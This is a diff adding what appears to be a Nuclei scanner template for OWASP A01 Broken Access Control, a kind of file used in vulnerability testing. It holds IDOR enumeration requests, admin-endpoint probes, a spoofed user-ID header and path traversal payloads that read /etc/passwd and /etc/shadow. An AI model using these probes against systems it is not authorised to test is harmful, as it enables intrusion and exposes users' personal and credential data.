@@ -1,0 +1,130 @@
+id: a01-broken-access-control
+
+info:
+  name: A01:2021 - Broken Access Control
+  author: legioncyber
+  severity: high
+  description: |
+    Tests for common Broken Access Control vulnerabilities including IDOR, missing
+    function-level access control, and path traversal. Maps to OWASP Top 10 2021 A01.
+  tags: owasp,a01,idor,access-control,path-traversal,lfi
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
+    cvss-score: 8.2
+    cwe-id: CWE-284
+    owasp-id: A01-2021
+
+requests:
+  # -----------------------------------------------------------------------
+  # IDOR — numeric ID enumeration in common parameter names
+  # -----------------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user?id=1"
+      - "{{BaseURL}}/api/users/1"
+      - "{{BaseURL}}/user/profile?user_id=1"
+      - "{{BaseURL}}/account?id=1"
+      - "{{BaseURL}}/api/order?order_id=1"
+      - "{{BaseURL}}/api/document?doc_id=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "email"
+          - "username"
+          - "phone"
+          - "address"
+          - "password"
+          - "ssn"
+          - "credit_card"
+          - "account_number"
+        condition: or
+        part: body
+    extractors:
+      - type: regex
+        name: user_data_leaked
+        regex:
+          - '"email"\s*:\s*"[^"@]+@[^"]+"'
+          - '"username"\s*:\s*"[^"]+"'
+        part: body
+
+  # -----------------------------------------------------------------------
+  # Missing function-level access control — admin endpoints
+  # -----------------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin"
+      - "{{BaseURL}}/admin/"
+      - "{{BaseURL}}/admin/dashboard"
+      - "{{BaseURL}}/admin/users"
+      - "{{BaseURL}}/admin/settings"
+      - "{{BaseURL}}/management"
+      - "{{BaseURL}}/superadmin"
+      - "{{BaseURL}}/api/admin/users"
+      - "{{BaseURL}}/api/v1/admin"
+      - "{{BaseURL}}/backoffice"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "dashboard"
+          - "user management"
+          - "admin panel"
+          - "manage users"
+          - "system settings"
+          - "total users"
+          - "active sessions"
+        condition: or
+        part: body
+        case-insensitive: true
+
+  # -----------------------------------------------------------------------
+  # Path traversal
+  # -----------------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/download?file=../../../etc/passwd"
+      - "{{BaseURL}}/download?path=../../../etc/passwd"
+      - "{{BaseURL}}/file?name=../../../etc/passwd"
+      - "{{BaseURL}}/static/../../../etc/passwd"
+      - "{{BaseURL}}/img?src=..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}/read?filename=..%2F..%2F..%2Fetc%2Fshadow"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "daemon:.*:/usr/sbin"
+          - "www-data:.*:/var/www"
+        part: body
+
+  # -----------------------------------------------------------------------
+  # Horizontal privilege escalation — try accessing another account's resource
+  # -----------------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/invoice/1000"
+      - "{{BaseURL}}/api/invoice/1001"
+      - "{{BaseURL}}/api/profile/1000"
+    headers:
+      X-User-ID: "9999"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "invoice"
+          - "amount"
+          - "total"
+          - "billing"
+        condition: or
+        part: body
+        case-insensitive: true
